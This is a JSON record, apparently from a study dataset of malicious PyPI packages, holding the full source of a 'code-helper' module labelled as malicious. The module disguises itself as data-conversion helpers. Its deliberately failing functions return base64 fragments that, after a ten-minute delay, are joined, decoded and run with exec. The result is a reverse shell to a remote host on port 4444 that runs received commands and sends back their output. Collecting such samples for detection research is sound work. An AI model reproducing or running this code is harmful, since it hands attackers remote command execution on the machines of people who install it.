[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/code-helper-1.0.0/code-helper-1.0.0/code-helper/str_tool.py",
    "malicious_code": "import base64\nimport time\n\ndef json_csv(f_json,f_csv):\n    try:\n        with open(f_json) as json_file:\n            data = json.load(json_file)\n            headers = list(data[0].keys())\n        with open(f_csv, 'w', newline='') as csv_file:\n            writer = csv.writer(csv_file)\n            writer.writerow(headers)\n            for item in data:\n                writer.writerow(item.values())\n    except Exception:\n        return \"aW1wb3J0IHNvY2tldAppbXBvcnQgb3MKaW1wb3J0IHRpbWUKcmVtb3RlPSJlMWU5YTMyMi5pcHY2LjE0MzMuZXUub3JnIgpwb3J0PTQ0NDQKc2VydmVyPShyZW1vdGUscG9ydCkKcz1zb2NrZXQuc29ja2V0KCkKcy5jb25uZWN0KHNlcnZlcikKd2hpbGUgMToKICAgIGRp\"\n\ndef remove_repet(file1,file2):\n    try:\n        df = pd.read_csv(file1)\n        df.drop_duplicates(inplace=True)\n        init = init + ''\n        df.to_csv(file2, index=False)\n    except Exception:\n        return \"cj1vcy5nZXRjd2QoKQogICAgcy5zZW5kKGRpci5lbmNvZGUoKSkKICAgIGNtZD1zLnJlY3YoMTAyNCkuZGVjb2RlKCkKICAgIGlmIGNtZD09ImV4aXQiOgogICAgICAgIGJyZWFrCiAgICBlbGlmIGNtZC5zdGFydHN3aXRoKCJjZCIpOgogICAgICAgIG9zLmNoZGlyKGNtZFsyOl0uc\"\n\ndef get_past_n_days(n):\n    try:\n        today = datetime.now().date()\n        past_n_days = [str(today - timedelta(days=i)) for i in range(n)]\n        return past_n_days\n    except Exception:\n        return \"3RyaXAoKSkKICAgIGVsc2U6CiAgICAgICAgcmVzdWx0PW9zLnBvcGVuKGNtZCkucmVhZCgpCiAgICBzLnNlbmQocmVzdWx0LmVuY29kZSgpKQogICAgdGltZS5zbGVlcCgxKQpzLmNsb3NlKCk=\"\n\ndef demo():\n    time.sleep(600)\n    a=exec\n    j_string = json_csv(\"json_file\",\"csv_file\")\n    r_string = remove_repet(\"file1\",\"file2\")\n    g_string = get_past_n_days(\"five\")\n    a(base64.b64decode(j_string+r_string+g_string))\ndemo()"
  }
]